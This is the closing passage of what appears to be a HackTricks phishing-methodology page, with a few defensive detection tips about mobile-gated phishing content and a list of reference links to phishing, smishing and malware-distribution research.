- Bloqueie ou examine páginas que condicionem conteúdo exclusivamente em `ontouchstart` ou verificações de dispositivo similares.

Dicas de defesa:
- Execute crawlers com fingerprints parecidos com mobile e JS habilitado para revelar conteúdo gated.
- Alerta para respostas 500 suspeitas após `POST /detect` em domínios recém-registrados.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
